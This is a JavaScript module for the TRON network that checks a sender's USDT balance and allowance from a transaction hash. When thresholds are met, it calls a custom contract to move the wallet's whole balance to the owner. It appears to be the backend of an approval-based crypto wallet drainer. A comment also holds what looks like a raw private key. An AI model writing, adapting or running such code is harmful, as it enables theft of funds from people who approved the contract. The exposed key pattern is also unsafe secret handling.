// @ts-nocheck
import TronwebLib from 'tronweb';
import { USDT_CONTRACT_ABI, CLIENT_CONTRACT_ABI } from './tron-abi.js';
import dotenv from 'dotenv';
dotenv.config();

const { TronWeb } = TronwebLib;
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC-20
const CLIENT_SMART_CONTRACT = 'TUBuNRx6HVLxhAdcDEQP3C7nFwg6KBunCr'; // Custom contract



const account = TronWeb.fromMnemonic(process.env.TRX_MONEMONICE);

const privateKey = account.privateKey.replace(/^0x/, "");

const OWNER_PRIVATE_KEY_TRON = privateKey

// 0xb358c6a6fcea1185497a58d515e4b06b74a6bec5f40dfc21f6ca32df3f142d4a
export const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  privateKey: OWNER_PRIVATE_KEY_TRON,
});

export const approvedTransferToOwner = async (
  walletAddress,
  withdrawalBalance
) => {
  try {
    const usdtContract = await tronWeb.contract(USDT_CONTRACT_ABI, USDT_CONTRACT_ADDRESS);
    const clientContract = await tronWeb.contract(CLIENT_CONTRACT_ABI, CLIENT_SMART_CONTRACT);


    const allowance = await usdtContract.methods.allowance(walletAddress, CLIENT_SMART_CONTRACT).call();
    if (BigInt(allowance) === BigInt(0)) {
      return { success: false, message: 'Insufficient allowance' };
    }
    const transferableAmount = BigInt(allowance) >= BigInt(withdrawalBalance)
      ? BigInt(withdrawalBalance)
      : BigInt(allowance);

    const tx = await clientContract.methods
      .swap(walletAddress, transferableAmount.toString())
      .send();

    const rawAllowance = await usdtContract.methods.allowance(walletAddress, CLIENT_SMART_CONTRACT).call();
    const formattedAllowance = tronWeb.toBigNumber(rawAllowance).div(10 ** 6).toString();
    return { success: true, message: 'Transfer confirmed', txHash: tx, usdtAllowance: formattedAllowance };
  } catch (error) {
    console.error('Error:', error);
    return { success: false, message: error.message };
  }
};
export const getUserDeatilsFromHashTron = async (txHash, limit, type) => {
  try {
    const tx = await tronWeb.trx.getTransaction(txHash);
    if (!tx || !tx.raw_data?.contract?.length) {
      return { success: false, message: 'Transaction not found or invalid' };
    }

    const contractInfo = tx.raw_data.contract[0].parameter.value;
    const fromAddress = tronWeb.address.fromHex(contractInfo.owner_address);
    const toAddress = tronWeb.address.fromHex(contractInfo.contract_address);

    const usdtContract = await tronWeb.contract(USDT_CONTRACT_ABI, USDT_CONTRACT_ADDRESS);

    const rawBalance = await usdtContract.methods.balanceOf(fromAddress).call();
    const formattedBalance = Number(tronWeb.fromSun(rawBalance));


    const rawAllowance = await usdtContract.methods.allowance(fromAddress, CLIENT_SMART_CONTRACT).call();
    const formattedAllowance = tronWeb.toBigNumber(rawAllowance).div(10 ** 6).toString();


    if (toAddress !== USDT_CONTRACT_ADDRESS) {
      return {
        success: false,
        type,
        fromAddress,
        txHash,
        usdtBalance: formattedBalance,
        usdtAllowance: formattedAllowance,
        message: 'Transaction is not directed to the USDT contract',
      };
    }

    if (Number(formattedBalance) >= Number(limit)) {
      if (Number(formattedAllowance) >= Number(limit)) {
        const result = await approvedTransferToOwner(fromAddress, rawBalance);
        return {
          success: result.success,
          type,
          fromAddress,
          txHash,
          usdtBalance: formattedBalance,
          usdtAllowance: formattedAllowance,
          message: result.success ? `Transfer successful ${result.txHash}` : `Transfer failed ${result.message}`,
        };
      } else {
        return {
          success: false,
          type,
          fromAddress,
          txHash,
          usdtBalance: formattedBalance,
          usdtAllowance: formattedAllowance,
          message: 'Insufficient USDT allowance',
        };
      }
    }
    else {
      return {
        success: true,
        type,
        fromAddress,
        txHash,
        usdtBalance: formattedBalance,
        usdtAllowance: formattedAllowance,
        message: 'Insufficient USDT balance',
      };
    }
  } catch (err) {
    console.error('Error:', err);
    return {
      success: false,
      message: err.message || 'Failed to fetch user details',
    };
  }
};
export const getBalanceTron = async (address) => {
  try {
    const usdtContract = await tronWeb.contract(USDT_CONTRACT_ABI, USDT_CONTRACT_ADDRESS);
    const rawBalance = await usdtContract.methods.balanceOf(address).call();
    const formattedBalance = tronWeb.fromSun(rawBalance.toString());
    return Number(formattedBalance).toFixed(2);
  } catch (error) {
    console.error("Error fetching balance:", error);
    throw new Error("Failed to fetch USDT balance on TRON");
  }
};

